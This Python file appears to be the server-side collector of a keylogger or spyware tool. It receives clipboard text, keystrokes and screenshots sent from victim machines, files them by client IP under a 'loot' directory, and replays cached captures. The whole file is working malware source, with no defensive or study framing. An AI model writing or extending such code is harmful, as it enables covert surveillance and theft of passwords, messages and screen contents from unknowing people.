import os
import config
from utils import log, ensure_directory_exists
from management import manage_screenshots_storage


def save_clipboard_data(client_dir, data):
    file_path = os.path.join(client_dir, "clipboard.txt")
    entry = (
        f"[{data['timestamp']}]\n"
        f"{data['content']}\n\n"
    )

    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(entry)
        log(f"Saved clipboard data to {file_path}", "SUCCESS", "filesystem")
    except Exception as e:
        log(f"Failed to save clipboard data: {e}", "ERROR", "filesystem")


def save_keystroke_data(client_dir, data):
    file_path = os.path.join(client_dir, "keystrokes.txt")
    entry = (
        f"[{data['timestamp']}]\n"
        f"{data['text']}\n\n"
    )

    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(entry)
        log(f"Saved keystroke data to {file_path}", "SUCCESS", "filesystem")
    except Exception as e:
        log(f"Failed to save keystroke data: {e}", "ERROR", "filesystem")


def save_screenshot_data(client_dir, data):
    try:
        # Create screenshots directory
        screenshot_dir = ensure_directory_exists(os.path.join(client_dir, "screenshots"))

        # Sanitize filename
        filename = f"{data['timestamp']}.jpg"
        safe_filename = "".join(c for c in filename if c.isalnum() or c in "._-")

        # Save image
        file_path = os.path.join(screenshot_dir, safe_filename)
        with open(file_path, "wb") as f:
            f.write(data["binary_data"])

        log(f"Saved screenshot to {file_path}", "SUCCESS", "filesystem")

        # Apply storage management after saving
        manage_screenshots_storage(client_dir)
    except Exception as e:
        log(f"Failed to save screenshot: {e}", "ERROR", "filesystem")


def save_cached_data(client_dir, data):
    data_type = data["type"]
    original_timestamp = data.get("original_timestamp", data["timestamp"])

    if data_type == "clipboard":
        # Preserve original timestamp
        data["data"]["timestamp"] = original_timestamp
        save_clipboard_data(client_dir, data["data"])
    elif data_type == "keystroke":
        data["data"]["timestamp"] = original_timestamp
        save_keystroke_data(client_dir, data["data"])
    elif data_type == "screenshot":
        # For screenshots, we already use the timestamp in the filename
        save_screenshot_data(client_dir, data)


def handle_data(client_ip, payload):
    try:
        client_dir = ensure_directory_exists(os.path.join(config.LOOT_DIR, client_ip))

        data_type = payload.get("type", "unknown")
        log(f"Received {data_type} data from {client_ip}", module="filesystem")

        if data_type == "clipboard":
            save_clipboard_data(client_dir, payload["data"])
        elif data_type == "keystroke":
            save_keystroke_data(client_dir, payload["data"])
        elif data_type == "screenshot":
            save_screenshot_data(client_dir, payload)
        else:
            log(f"Unknown data type: {data_type}", "WARNING", "filesystem")
    except Exception as e:
        log(f"Error handling data from {client_ip}: {e}", "ERROR", "filesystem")
